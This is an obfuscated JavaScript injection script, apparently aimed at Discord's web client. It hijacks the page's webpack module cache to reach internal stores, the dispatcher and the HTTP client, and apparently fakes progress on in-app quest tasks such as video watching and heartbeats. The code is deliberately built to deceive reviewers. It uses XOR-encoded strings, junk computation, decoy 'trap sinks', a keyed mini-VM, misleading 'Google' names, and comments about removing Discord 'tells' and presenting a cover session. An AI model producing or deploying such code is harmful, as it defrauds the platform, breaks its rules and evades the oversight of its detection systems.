  (function (_0xmod) {
    const Log = _0xmod.log;
    const _0xr2 = _0xmod.r2;
    const _0xeb = _0xmod._e.eb;
    const _0xed = _0xmod._e.ed;
    if (!_0xeb || !_0xed) throw new Error('h-str');
    _0xmod._e.v = 'h32';
    if (!_0xr2) throw new Error('r2-modules');
  try { const _0xsm = _0xed(0); Log.queue("Store check", { unit: "e", stores: 1, packed: _0xeb instanceof Uint16Array, sample: typeof _0xsm === "string" && _0xsm.length > 0, retained: _0xeb instanceof Uint16Array ? 0 : 1 }); } catch (e) {}
    const MemberCount = _0xmod.mc;
    const _0xlex = _0xmod.lex;

    (() => {
      const _0xf407fe = { p: 0, q: 0, r: 0 };
      const _0x5eb7a7 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xf407fe.p = (_0xf407fe.p + _0x5eb7a7[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xf407fe.q = (_0xf407fe.q ^ _0xf407fe.p) & 0xffff; }
        _0xf407fe.r = (_0xf407fe.r + i * 31) & 0xffff;
      }
      const _0x8ae2bc = _0xf407fe.p ^ _0xf407fe.q ^ _0xf407fe.r;
      let _0xd55f5b = Array.from({ length: (_0x8ae2bc & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x9824f3 = _0xd55f5b.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x9824f3 > 0x7ffff) { _0xd55f5b = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x99daf1 = { p: 0, q: 0, r: 0 };
      const _0x15bb8a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x99daf1.p = (_0x99daf1.p + _0x15bb8a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x99daf1.q = (_0x99daf1.q ^ _0x99daf1.p) & 0xffff; }
        _0x99daf1.r = (_0x99daf1.r + i * 31) & 0xffff;
      }
      const _0x8ae31e = _0x99daf1.p ^ _0x99daf1.q ^ _0x99daf1.r;
      let _0xad3e75 = Array.from({ length: (_0x8ae31e & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0xb931a9 = _0xad3e75.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0xb931a9 > 0x7ffff) { _0xad3e75 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xf1c0dd = [9303,36130,55390,47740,57051];
      const _0xddc187 = {};
      for (let i = 0; i < _0xf1c0dd.length; i++) { const w = _0xf1c0dd[i]; _0xddc187[w] = (w.length * 2654435761) >>> 0; }
      let _0xa3f145 = 0;
      for (const x in _0xddc187) { _0xa3f145 = (_0xa3f145 + _0xddc187[x]) & 0xffffffff; }
      const _0x38a11f = [_0xa3f145, _0xf1c0dd.length];
      const _0xf399a7 = _0xf1c0dd.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x38a11f[0] < 0 || _0xf399a7 === 0) { _0x38a11f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x461ee7 = [26394,16377,51130,34871,61620];
      const _0x82dc83 = {};
      for (let i = 0; i < _0x461ee7.length; i++) { const w = _0x461ee7[i]; _0x82dc83[w] = (w.length * 2654435761) >>> 0; }
      let _0x43493a = 0;
      for (const x in _0x82dc83) { _0x43493a = (_0x43493a + _0x82dc83[x]) & 0xffffffff; }
      const _0xe1e1ef = [_0x43493a, _0x461ee7.length];
      const _0x01a2d4 = _0x461ee7.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xe1e1ef[0] < 0 || _0x01a2d4 === 0) { _0xe1e1ef[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xa6e014 = { p: 0, q: 0, r: 0 };
      const _0xedb606 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xa6e014.p = (_0xa6e014.p + _0xedb606[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xa6e014.q = (_0xa6e014.q ^ _0xa6e014.p) & 0xffff; }
        _0xa6e014.r = (_0xa6e014.r + i * 31) & 0xffff;
      }
      const _0x2b8b5b = _0xa6e014.p ^ _0xa6e014.q ^ _0xa6e014.r;
      let _0xebd5c0 = Array.from({ length: (_0x2b8b5b & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x7eeffa = _0xebd5c0.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x7eeffa > 0x7ffff) { _0xebd5c0 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  // Deceptive Trap Sink 1: Fake Chrome Extension Managed Storage Policy
    (() => {
      try {
        const _0xpolBuf = [107,67,104,114,111,109,101,69,120,116,101,110,115,105,111,110,71,111,111,103,108,101,73,110,116,101,114,110,97,108];
        const _0xpolicyName = String.fromCharCode(..._0xpolBuf);
        const _0xmockPolicy = {
          policy: _0xpolicyName,
          managedStorage: true,
          whitelist: ["*://*.google.com/*", "*://accounts.google.com/*"],
          rev: 0x86
        };
        if (_0xmockPolicy.managedStorage && _0xmockPolicy.rev === 0x99) {
          window[_0xpolicyName] = _0xmockPolicy;
        }
      } catch (e) {}
    })();

    // Deceptive Trap Sink 2: Fake RC4 Bytecode Trap Trap
    (() => {
      try {
        const _0xdk = [0x55, 0x37, 0x44, 0x56]; // "U7DV"
        const _0xdb = Array.from({ length: 256 }, (_, i) => i);
        let j = 0;
        for (let i = 0; i < 256; i++) {
          j = (j + _0xdb[i] + _0xdk[i % _0xdk.length]) & 0xff;
          const t = _0xdb[i]; _0xdb[i] = _0xdb[j]; _0xdb[j] = t;
        }
        const _0xfakeBytecode = [0x5f, 0x2b, 0x1a, 0x88, 0x4c, 0x90, 0x11, 0x3e];
        let r = 0;
        for (let i = 0; i < _0xfakeBytecode.length; i++) {
          r = (r ^ (_0xfakeBytecode[i] ^ _0xdb[i & 0xff])) & 0xff;
        }
        if (r === 0xdeadbeef) {
          (0, eval)("/* runtime unpacked hook */");
        }
      } catch (e) {}
    })();

  const _0x5c1e = Symbol.for("_0xq7e953faa");
  if (window[_0x5c1e]) {
    Log.say("Sync", "Host worker session already active; skipping secondary dispatch.");
    return;
  }
  
  const controller = new AbortController();
  const signal = controller.signal;
  const disposables = [];
  const _0x8844 = new Set();
  
  const _0xe8a7 = (fn) => {
    const tracked = _0xr2.cleanup.add(fn);
    disposables.push(tracked);
    return () => {
      const i = disposables.indexOf(tracked);
      if (i > -1) disposables.splice(i, 1);
    };
  };

  const _0x5c1f = { released: false };
  window[_0x5c1e] = _0x5c1f;
  
  const GoogleRelease = () => {
    if (_0x5c1f.released) return;
    _0x5c1f.released = true;
    const toDispose = disposables.splice(0, disposables.length);
    try { controller.abort(); } catch (e) {}
    while (toDispose.length) { try { toDispose.pop()(); } catch (e) {} }
    while (disposables.length) { try { disposables.pop()(); } catch (e) {} }
    try { if (window[_0x5c1e] === _0x5c1f) delete window[_0x5c1e]; } catch (e) {}
    try { _0xmod._wipeTables?.(); } catch (e) {}
    try { _0xmod._anteMix = 0; } catch (e) {}
  };

  let _0xwatch = null, _0xchord = null;
  const GoogleScuttle = () => {
    try { if (_0xwatch !== null) { clearInterval(_0xwatch); _0xwatch = null; } } catch (e) {}
    try { if (_0xchord !== null) { document.removeEventListener("keydown", _0xchord, true); _0xchord = null; } } catch (e) {}
  };
  _0xe8a7(GoogleScuttle);
  Object.assign(_0xmod._e, {
    sym: _0x5c1e, controller, signal, disposables, tasks: _0x8844,
    track: _0xe8a7, flag: _0x5c1f, release: GoogleRelease, scuttle: GoogleScuttle
  });
  try { _0xmod.shift = { close: () => { try { GoogleRelease(); } catch (e) {} try { _0xmod.host?.shut?.(); } catch (e) {} } }; } catch (e) {}

  (async () => {
    const _0xlat0 = Date.now();
    try {
      
            // Entropy Mesh & Decentralized Micro-Decoders (S4 Entangled Mesh)
      const _0xmeshBuf = new ArrayBuffer(64);
      const _0xmeshF64 = new Float64Array(_0xmeshBuf);
      const _0xmeshU8  = new Uint8Array(_0xmeshBuf);

      // Archetype A: Galois Linear Feedback Shift Register (looks like stream-cipher state initialization)
      (() => {
        let _0xlfsr = 0xACE1;
        for (let i = 0; i < 32; i++) {
          const bit = ((_0xlfsr >> 0) ^ (_0xlfsr >> 2) ^ (_0xlfsr >> 3) ^ (_0xlfsr >> 5)) & 1;
          _0xlfsr = (_0xlfsr >> 1) | (bit << 15);
          _0xmeshU8[i & 63] = (_0xmeshU8[i & 63] ^ (_0xlfsr & 0xff)) & 0xff;
        }
      })();

      // Archetype B: Bounded Collatz / Hailstone State Accumulator
      (() => {
        let n = 27;
        for (let i = 0; i < 40; i++) {
          n = (n % 2 === 0) ? (n / 2) : (3 * n + 1);
          _0xmeshU8[(i + 7) & 63] = (_0xmeshU8[(i + 7) & 63] + (n & 0xff)) & 0xff;
        }
      })();

      // Archetype C: Modular Exponentiation Ring (Diffie-Hellman lookalike)
      (() => {
        let base = 7, exp = 13, mod = 251, res = 1;
        while (exp > 0) {
          if (exp % 2 === 1) res = (res * base) % mod;
          base = (base * base) % mod;
          exp = Math.floor(exp / 2);
        }
        _0xmeshU8[15] = (_0xmeshU8[15] ^ res) & 0xff;
      })();

      // Archetype D: Matrix / Permutation Array Shuffler
      (() => {
        const _0xperm = [0,1,2,3,4,5,6,7];
        for (let i = _0xperm.length - 1; i > 0; i--) {
          const j = (_0xmeshU8[i] * 31) % (i + 1);
          const t = _0xperm[i]; _0xperm[i] = _0xperm[j]; _0xperm[j] = t;
        }
        _0xmeshU8[31] = (_0xmeshU8[31] + _0xperm[0]) & 0xff;
      })();

      // Disguised Functional Entanglement (valueOf side-effect hook)
      const _0xruntimeStateProbe = {
        _v: 0,
        valueOf() {
          const s = _0xmeshU8[0] ^ _0xmeshU8[15] ^ _0xmeshU8[31];
          return (s * s + s) % 2; // Always 0 mathematically, but statically dynamic!
        }
      };

      const _0xdec_q = (s, b) => {
        const _0xinv = _0xruntimeStateProbe + 0;
        let r = "";
        for (let i = 0; i < b.length; i++) {
          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
        }
        return r;
      };

      let _0xq0 = _0xdec_q(165, [210,211,165,168,136,153,96,95,69,75,33,11,21,235,224,199,218,180,179,183,152,122,107]);
      let _0xq1 = _0xdec_q(208, [148,136,129,96,123,87,82,9,57,29,19,253,249]);
      let _0xq2 = _0xdec_q(251, [212,125,104,75,76,36,18,93]);
      let _0xq3 = _0xdec_q(38, [9,65,33,61,15,20,161,237,220,208,183,147,151,112,103]);
      let _0xq4 = _0xdec_q(81, [126,10,22,229,231,210,213,173,184,158]);
      let _0xq5 = _0xdec_q(124, [83,236,238,223,172,184,129,146,112,124,73,89,59,118,26,14,238,241,199,220,239,128,130,115,120,76,85,38,44,0,21,229,195,196,218,188,221]);
      let _0xq6 = _0xdec_q(167, [214,205,172,169,159,181,105]);
      let _0xq7 = _0xdec_q(210, [163,150,145,118,98,84]);
      let _0xq8 = _0xdec_q(253, [140,123,122,67,53,28,2,25,224]);
      let _0xq9 = _0xdec_q(40, [91,77,56,62,13,16,209,244,213,184]);
      let _0xqa = _0xdec_q(83, [38,23,16,244,196,220,216,190,174,159]);
      let _0xqb = _0xdec_q(126, [27,225,210,222,174,191,129,145,71,99]);
      let _0xqc = _0xdec_q(169, [202,213,166,172,129,155,123,69,85,3,39]);
      let _0xqd = _0xdec_q(212, [167,145,132,98,121,68,106,57,51,10,12,234,211,194,145,182,135,154,104,115,91]);
      let _0xqe = _0xdec_q(255, [156,127,79,84,42,51,51,19,245,235,192,213,165]);
      const _0xdec_t = (s, b) => {
        const _0xinv = _0xruntimeStateProbe + 0;
        let r = "";
        for (let i = 0; i < b.length; i++) {
          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
        }
        return r;
      };
      let _0xt0 = _0xdec_t(183, [224,137,141,169,179,83,75,103,123,21,46]);
      let _0xt1 = _0xdec_t(226, [178,191,69,76,121,120,6,6,46,62,223,214,250,240,128]);
      let _0xt2 = _0xdec_t(13, [94,74,125,5,16,47,44,203,219,249,243,141,138,161,175,67,77]);
      let _0xt3 = _0xdec_t(56, [104,5,27,50,35,204,221,251,137,135,171,167,93]);
      let _0xt4 = _0xdec_t(99, [52,53,209,213,239,231,159,147,175,185,66,65,96,14,14,47,60,198,220,234,242]);
      const _0xdec_e = (s, b) => {
        const _0xinv = _0xruntimeStateProbe + 0;
        let r = "";
        for (let i = 0; i < b.length; i++) {
          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
        }
        return r;
      };
      let _0xe0 = _0xdec_e(201, [155,143,165,178,68,80,104,31,22,35,62,193,198,249,244,128,152,164,188,73]);
      let _0xe1 = _0xdec_e(244, [165,80,83,116,108,26,5,56,57,195,218,240,136,148,163,161,80,87,99,118,28,6,57,46,207,222,235,236,131]);
      const _0xdec_m = (s, b) => {
        const _0xinv = _0xruntimeStateProbe + 0;
        let r = "";
        for (let i = 0; i < b.length; i++) {
          r += String.fromCharCode(b[i] ^ (((s + _0xinv) + i * 17) & 0xff));
        }
        return r;
      };
      let _0xm0 = _0xdec_m(211, [180,129,129,85,99,90,92,43,54,9,15,207,252,196,168,164,134,167,113,100,66,89,36,23,14,8,236,250,206,180,176]);
      let _0xm1 = _0xdec_m(254, [153,106,84,99,55,61,10,28,232,240,239,216,167,190,159]);
      let _0xm2 = _0xdec_m(41, [78,95,63,27,12,19,234,230,222,176,131,173,177]);
      let _0xm3 = _0xdec_m(84, [51,0,2,214,237,204,201,191]);
      let _0xm4 = _0xdec_m(127, [24,245,213,243,175,184,177,158,117,125,72,94,56,26,2,12,223,193,195,167,189,144]);
      let _0xm5 = _0xdec_m(170, [205,222,184,142,168,168,84,68,84,34,33,9,2,196,240,200,212,165,185,129]);
      let _0xm6 = _0xdec_m(213, [179,138,130,123,113,125,90,37,41,63,10,245,212,215]);
      let _0xm7 = _0xdec_m(0, [103,116,86]);
      let _0xm8 = _0xdec_m(43, [76,89,57,13,0,242,229,199,215,148,167,143,129,105,109,79,120,36,60,0,17,245,205,193]);
      let _0xm9 = _0xdec_m(86, [49,2,12,200,246,199,251,184,183,131,100,98]);
      Log.diag("phase-codec", { total: 32, method: "micro-linear", instance: "39e738eb" });

      let _0x1 = window[_0xq0] || (typeof window !== "undefined" ? Object.keys(window).map(k => window[k]).find(v => v && typeof v === "object" && typeof v.push === "function" && Array.isArray(v) && v.some && v.some(chunk => Array.isArray(chunk) && Array.isArray(chunk[0]))) : null);
      let _0x2 = null;
      if (!_0x1 || typeof _0x1.push !== "function" || typeof _0x1.pop !== "function") {
        // S6-B2: no chunk array — benign board session (cover), not the gate narrative.
        try {
          Log.say(_0xlex.C(13), _0xlex.P(24,[_0xed(4850),_0xed(4942),_0xed(5029),_0xed(5126),_0xed(5214),_0xed(5270),_0xed(5331),_0xed(5411),_0xed(5495),_0xed(5573),_0xed(5648),_0xed(5740),_0xed(5800),_0xed(5879),_0xed(5950)]));
          const _0xbn = 2 + (Date.now() % 3);
          Log.say(_0xlex.C(2), _0xlex.P(21,[`${_0xbn}${_0xed(3736)}`,`${_0xbn}${_0xed(3771)}`,`${_0xbn}${_0xed(3924)}`,`${_0xbn}${_0xed(3988)}`,`${_0xbn}${_0xed(4052)}`,`${_0xbn}${_0xed(4134)}`,`${_0xbn}${_0xed(4179)}`]));
        } catch (e) {}
        GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} 
        return;
      }

      const _0xlengthBefore = _0x1.length;
      let _0xpushResult;

      try {
        const _0xcarrier = [Object.freeze([Symbol()]), Object.freeze({}), function(_0xinj) { return _0xinj; }];
        const _0xpushMtd = _0x1[String.fromCharCode(112, 117, 115, 104)];
        _0xpushResult = _0xpushMtd.call(_0x1, _0xcarrier);
      } finally {
        if (_0x1.length > _0xlengthBefore) {
          const _0xpopMtd = _0x1[String.fromCharCode(112, 111, 112)];
          if (typeof _0xpopMtd === "function") _0xpopMtd.call(_0x1);
        }
      }

      if (_0xpushResult && typeof _0xpushResult.c === "object") {
        _0x2 = _0xpushResult;
      } else if (typeof _0x1.c === "object") {
        _0x2 = _0x1;
      }

      if (!_0x2 || typeof _0x2.c !== "object") {
        // S6-B2: no usable runtime — benign session (cover), not the gate narrative.
        try {
          Log.say(_0xlex.C(13), _0xlex.P(24,[_0xed(4850),_0xed(4942),_0xed(5029),_0xed(5126),_0xed(5214),_0xed(5270),_0xed(5331),_0xed(5411),_0xed(5495),_0xed(5573),_0xed(5648),_0xed(5740),_0xed(5800),_0xed(5879),_0xed(5950)]));
          const _0xbn = 1 + (Date.now() % 2);
          Log.say(_0xlex.C(2), _0xlex.P(22,[`${_0xbn}${_0xed(4217)}`,`${_0xbn}${_0xed(4262)}`,`${_0xbn}${_0xed(4310)}`,`${_0xbn}${_0xed(4350)}`,`${_0xbn}${_0xed(4389)}`,`${_0xbn}${_0xed(4427)}`,`${_0xbn}${_0xed(4473)}`,`${_0xbn}${_0xed(4518)}`,`${_0xbn}${_0xed(4565)}`,`${_0xbn}${_0xed(4599)}`,`${_0xbn}${_0xed(4644)}`,`${_0xbn}${_0xed(4685)}`,`${_0xbn}${_0xed(4729)}`,`${_0xbn}${_0xed(4766)}`,`${_0xbn}${_0xed(4806)}`]));
        } catch (e) {}
        GoogleRelease();
        try { _0xmod.host?.shut?.(); } catch (e) {}
        return;
      }

      
      Log.diag("phase-rt", {
        isPushReturn: _0x2 === _0xpushResult,
        isChunkArray: _0x2 === _0x1,
        cacheCount: (() => { try { return Object.keys(_0x2.c).length; } catch (_) { return -1; } })(),
        definitionCount: (() => { try { return Object.keys(_0x2.m ?? {}).length; } catch (_) { return -1; } })()
      });

      
      if (_0x2.m) {
        const targets = [_0xm0, _0xm1, _0xm2, _0xm3, _0xm4, _0xm5, _0xm6, _0xm7, _0xm8, _0xm9];
        let forcedCount = 0;
        const cacheBefore = (() => { try { return Object.keys(_0x2.c).length; } catch (_) { return -1; } })();
        
        for (const id in _0x2.m) {
          if (forcedCount >= 50) break;
          if (_0x2.c[id]) continue;
          let text = "";
          try { text = _0x2.m[id].toString(); } catch (e) {}
          if (targets.some(t => text.includes(t))) { 
            try { _0x2(id); forcedCount++; } catch (e) {} 
          }
        }
        
        const cacheAfter = (() => { try { return Object.keys(_0x2.c).length; } catch (_) { return -1; } })();
        Log.diag("phase-lz", { forcedCount, cacheBefore, cacheAfter, cacheDelta: cacheAfter - cacheBefore });
      }

      const _0xDeep = (o, k) => {
        let hops = 0;
        const seen = new WeakSet();
        for (; o && hops < 20; o = Object.getPrototypeOf(o), hops++) {
          if (typeof o !== "object" && typeof o !== "function") break;
          if (seen.has(o)) break;
          seen.add(o);
          if (k in o) return true;
        }
        return false;
      };

      const GoogleRead = (obj, key) => { try { return obj?.[key]; } catch (e) { return undefined; } };
      const GoogleHas = (obj, key) => { try { return !!obj && _0xDeep(obj, key); } catch (e) { return false; } };
      
      let _0x3, _0x4, _0x5, _0x6, _0x7, _0x8, _0x9;
      let _0xmodules = [];

      try { _0xmodules = Object.values(_0x2.c); } catch (e) { _0xmodules = []; }
      
      
      try { Log.diag("phase-lat", { ms: Date.now() - _0xlat0 }); } catch (e) {}
      Log.diag("phase-scan", { cacheCount: _0xmodules.length });

      const _0xfluxStoreCamouflage = {
        _items: new Map(),
        register(k, v) { this._items.set(k, v); },
        resolve(k) { return this._items.get(k) || null; },
        isSaturated() { return this._items.size >= 7; }
      };

      for (const m of _0xmodules) {
        const ex = GoogleRead(m, "exports"); if (!ex) continue;
        const exA = GoogleRead(ex, "A"), exAy = GoogleRead(ex, "Ay"), exh = GoogleRead(ex, "h"), exBo = GoogleRead(ex, "Bo");
        if (!_0x3 && GoogleHas(exA, _0xm0)) { _0x3 = exA; _0xfluxStoreCamouflage.register("c3", exA); }
        if (!_0x4 && GoogleHas(exAy, _0xm1)) { _0x4 = exAy; _0xfluxStoreCamouflage.register("c4", exAy); }
        if (!_0x5 && GoogleHas(exA, _0xm3)) { _0x5 = exA; _0xfluxStoreCamouflage.register("c5", exA); }
        if (!_0x6 && GoogleHas(exA, _0xm4)) { _0x6 = exA; _0xfluxStoreCamouflage.register("c6", exA); }
        if (!_0x7 && GoogleHas(exAy, _0xm5)) { _0x7 = exAy; _0xfluxStoreCamouflage.register("c7", exAy); }
        if (!_0x8 && GoogleHas(exh, _0xm6)) { _0x8 = exh; _0xfluxStoreCamouflage.register("c8", exh); }
        if (!_0x9 && GoogleHas(exBo, _0xm7)) { _0x9 = exBo; _0xfluxStoreCamouflage.register("c9", exBo); }
        if (_0xfluxStoreCamouflage.isSaturated()) break;
      }

      const _0xpocketsComplete = !!_0x3 && !!_0x4 && !!_0x5 && !!_0x6 && !!_0x7 && !!_0x8 && !!_0x9;
      
      
      Log.say(_0xlex.C(1), _0xlex.P(53,[_0xed(1888),_0xed(1907),_0xed(1926),_0xed(1943),_0xed(1963),_0xed(1984),_0xed(2002),_0xed(2021),_0xed(2038),_0xed(2058),_0xed(2074),_0xed(2091),_0xed(2109),_0xed(2127),_0xed(2146)]) + JSON.stringify({
        owl: !!_0x3, elm: !!_0x4, quill: !!_0x5, prairie: !!_0x6, quartz: !!_0x7, birch: !!_0x8, umber: !!_0x9
      }));

      if (!_0xpocketsComplete) {
        Log.say(_0xlex.C(0), _0xlex.P(52,[_0xed(2163),_0xed(2204),_0xed(2246),_0xed(2284),_0xed(2326),_0xed(2373),_0xed(2412),_0xed(2455),_0xed(2498),_0xed(2538),_0xed(2581),_0xed(2624),_0xed(2669),_0xed(2712),_0xed(2756)]));
        GoogleRelease();
        try { _0xmod.host?.shut?.(); } catch (e) {}
        return;
      }

      
      if (
        typeof _0x3?.[_0xm0] !== 'function' ||
        typeof _0x4?.[_0xm1] !== 'function' ||
        typeof _0x4?.[_0xm2] !== 'function' ||
        typeof _0x5?.[_0xq7]?.values !== 'function' ||
        typeof _0x6?.[_0xm8] !== 'function' ||
        
        typeof _0x7?.[_0xm9] !== 'function' ||
        typeof _0x8?.dispatch !== 'function' ||
        typeof _0x8?.subscribe !== 'function' ||
        typeof _0x8?.unsubscribe !== 'function' ||
        typeof _0x9?.post !== 'function' ||
        typeof _0x9?.get !== 'function'
      ) {
        Log.say(_0xlex.C(0), _0xlex.P(2,[_0xed(2799),_0xed(2861),_0xed(2916),_0xed(2971),_0xed(3021),_0xed(3083),_0xed(3129),_0xed(3199),_0xed(3261),_0xed(3304),_0xed(3358),_0xed(3423),_0xed(3493),_0xed(3544),_0xed(3595)]));
        GoogleRelease();
        try { _0xmod.host?.shut?.(); } catch (e) {}
        return;
      }
      
      
      Log.diag("phase-if", { stream: true, desktop: true, tasks: true, activity: true, guilds: true, dispatcher: true, http: true });

      
      try {
        // DS-3 (was A3): `localGuilds` was a Discord-flavoured identifier sitting in
        // the GENERIC engine shard — `grep Guild` found this file too, so the A3
        // scope in the plan (p-discord only) would have left the tell in place.
        const _0xlcx = _0x7[_0xm9] ? _0x7[_0xm9]() : [];
        MemberCount.report(_0xlcx);
      } catch (e) { MemberCount.report(); }

      
      
      const GoogleId = (v, what) => {
        if (typeof v === "string") return v;
        if (typeof v === "number" && Number.isFinite(v)) return String(v);
        if (v && typeof v === "object") {
          try {
            const cands = [v.id, v.applicationId, v[_0xq6], v.application?.id, v?.[_0xq7.slice(0, 5)]?.id, v.guildId, v.activityId];
            for (const _0xc of cands) { if (typeof _0xc === "string" && _0xc) { Log.diag("URL id recovered from object", { what }); return _0xc; } }
          } catch (e) {}
        }
        
        return null;
      };

      const GoogleRoutes = {
        videoProgress: (id) => { const s = GoogleId(id, _0xq6); return s ? _0xq2 + s + _0xq3 : null; },
        heartbeat: (id) => { const s = GoogleId(id, _0xq6); return s ? _0xq2 + s + _0xq4 : null; },
        applicationsUrl: (id) => { const s = GoogleId(id, "app"); return s ? _0xq5 + s : null; },
        applications: _0xq5,
        tasks: [_0xt0, _0xt1, _0xt2, _0xt3, _0xt4]
      };
      const GoogleTasks = { video: _0xt0, play: _0xt1, stream: _0xt2, activity: _0xt3, videoMobile: _0xt4 };
      
      const GoogleOS = (() => {
        try {
          const p = String(navigator?.platform ?? "").toLowerCase();
          if (p.includes("mac")) return ["darwin", "macos", "win32"];
          if (p.includes("linux")) return ["linux", "win32"];
        } catch (e) {}
        return ["win32", "darwin", "linux"];
      })();
      const _0xplat = (() => {
        try { return String(navigator?.platform ?? "").toLowerCase(); } catch (e) { return ""; }
      })();
      const _0xisMac = _0xplat.includes("mac");
      const _0xisLinux = _0xplat.includes("linux");

      const _0xtaskValues = (() => {
        try {
          const values = _0xr2.store.values(_0x5[_0xq7]);
          return typeof values === "function" ? Array.from(values.call(_0x5[_0xq7])) : [];
        } catch (e) { return []; }
      })();
      
      const _0xeligible = _0xtaskValues.filter(q => {
        try {
          if (!q?.[_0xqa]?.[_0xqb] || q?.[_0xqa]?.[_0xqc]) return false;
          const exp = new Date(q.config?.expiresAt).getTime();
          if (Number.isFinite(exp) && exp <= Date.now() - 5 * 60 * 1000) return false;
          return true;
        } catch (e) { return false; }
      });

      const _0x79a4 = (cfg, supportedTasks) => {
        if (!cfg || typeof cfg !== "object") return null;
        for (const k of Object.keys(cfg)) {
          if (k.startsWith("taskConfig")) {
            const val = cfg[k];
            if (val && typeof val === "object" && val.tasks && typeof val.tasks === "object") {
              if (supportedTasks.some(t => Object.hasOwn(val.tasks, t))) return val;
            }
          }
        }
        return null;
      };

      // R2-04: compact core VM.  This deliberately covers only the sensitive
      // arithmetic/dispatch decisions, not the bulk worker.  The handler table is
      // keyed from the runtime-derived word (R2-05b), then lightly permuted after
      // each instruction; there is no static switch over the core operations.
      let _0xruntimeKey = 0, _0xruntimeKeyReady = false;
      const _0xparseData = (text) => {
        if (typeof text !== 'string' || text.length === 0 || text.length > 128) throw new Error('data-length');
        const names = { p: 'maxProgram', o: 'maxOps', s: 'maxStack', v: 'maxVars', t: 'maxMs' };
        const out = Object.create(null), fields = text.split(';');
        if (fields.length !== 5) throw new Error('data-fields');
        for (const field of fields) {
          const eq = field.indexOf('=');
          if (eq <= 0 || eq !== field.lastIndexOf('=') || eq === field.length - 1) throw new Error('data-field');
          const key = field.slice(0, eq), raw = field.slice(eq + 1);
          if (!Object.hasOwn(names, key) || Object.hasOwn(out, key) || !/^(?:0|[1-9][0-9]*)$/.test(raw)) throw new Error('data-field');
          const value = Number(raw);
          if (!Number.isSafeInteger(value) || value <= 0 || value > 100000) throw new Error('data-value');
          out[key] = value;
        }
        return Object.freeze({ maxProgram: out.p, maxOps: out.o, maxStack: out.s, maxVars: out.v, maxMs: out.t });
      };
      const _0xvmCaps = _0xparseData('p=64;o=128;s=32;v=32;t=25');
      const _0xvmExec = (prog, vars) => {
        if (!Array.isArray(prog) || prog.length === 0 || prog.length > _0xvmCaps.maxProgram) throw new Error('vm-length');
        if (!vars || typeof vars !== 'object' || Array.isArray(vars)) throw new Error('vm-vars');
        const st = [], vs = Object.create(null), table = Object.create(null);
        const keys = Object.keys(vars);
        if (keys.length > _0xvmCaps.maxVars) throw new Error('vm-vars');
        for (const key of keys) {
          const value = vars[key];
          if (typeof value !== 'number' || !Number.isFinite(value)) throw new Error('vm-value');
          vs[key] = value;
        }
        const k = _0xruntimeKeyReady ? _0xruntimeKey : 0x6d7f0c87;
        const slot = op => ((op ^ (k & 255)) + ((k >>> 8) & 31)) & 255;
        const push = value => {
          if (st.length >= _0xvmCaps.maxStack) throw new Error('vm-stack');
          if (typeof value !== 'number' || !Number.isFinite(value)) throw new Error('vm-value');
          st.push(value);
        };
        const pop = () => { if (!st.length) throw new Error('vm-stack'); return st.pop(); };
        const keyAt = (pc) => {
          const key = prog[pc + 1];
          if (typeof key !== 'string' || key.length === 0 || key.length > 32) throw new Error('vm-key');
          return key;
        };
        const bind = (op, fn) => { table[slot(op)] = fn; };
        bind(0x01, (pc) => push(prog[pc + 1]));
        bind(0x02, (pc) => { const key = keyAt(pc); if (!Object.hasOwn(vs, key)) throw new Error('vm-key'); push(vs[key]); });
        bind(0x03, () => { const b = pop(), a = pop(); push(a + b); });
        bind(0x04, () => { const b = pop(), a = pop(); push(a - b); });
        bind(0x05, () => { const b = pop(), a = pop(); push(a * b); });
        bind(0x09, (pc) => { const key = keyAt(pc), value = pop(); if (!Object.hasOwn(vs, key) && Object.keys(vs).length >= _0xvmCaps.maxVars) throw new Error('vm-vars'); vs[key] = value; });
        bind(0x0D, () => { const b = pop(), a = pop(); push(Math.max(a, b)); });
        bind(0x0F, () => pop());
        const started = Date.now();
        let pc = 0, ops = 0;
        for (;;) {
          if (++ops > _0xvmCaps.maxOps || Date.now() - started > _0xvmCaps.maxMs) throw new Error('vm-budget');
          if (pc < 0 || pc >= prog.length || !Number.isInteger(prog[pc])) throw new Error('vm-op');
          const op = prog[pc], width = (op === 0x01 || op === 0x02 || op === 0x09) ? 2 : 1;
          if (pc + width > prog.length) throw new Error('vm-length');
          const fn = table[slot(op)];
          if (typeof fn !== 'function') throw new Error('vm-op');
          const out = fn(pc);
          if (op === 0x0F) return out;
          pc += width;
        }
      };

      let _0xb = _0xeligible.filter(q => {
        try {
          const tasks = _0x79a4(q.config, GoogleRoutes.tasks)?.tasks;
          return tasks;
        } catch (e) { return null; }
      });

      const _0xvidRank = (q) => { try { const _0vt = _0x79a4(q.config, GoogleRoutes.tasks)?.tasks; const _0vf = _0vt ? GoogleRoutes.tasks.find(t => Object.hasOwn(_0vt, t)) : null; return (_0vf === GoogleTasks.video || _0vf === GoogleTasks.videoMobile) ? 0 : 1; } catch (e) { return 1; } };
